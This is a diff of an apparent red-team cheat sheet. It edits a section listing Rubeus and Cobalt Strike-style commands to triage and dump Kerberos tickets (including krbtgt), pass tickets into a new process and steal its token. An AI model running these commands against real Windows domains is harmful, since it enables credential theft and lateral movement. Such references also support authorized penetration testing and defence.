@@ -241,12 +241,13 @@ ls \\<HOSTNAME>\c$
 ```
 
 #### Extract tickets
+- Extract tickets of a user, create new process, inject ticket into process, steal token from the process
 ```
 execute-assembly Rubeus.exe triage
-execute-assembly Rubeus.exe dump /service:<SERVICE> /luid:<LUID> /nowrap
+execute-assembly Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
 execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
-steal_token 4872
+steal_token <PID>
 ```
 
 ## Session passing
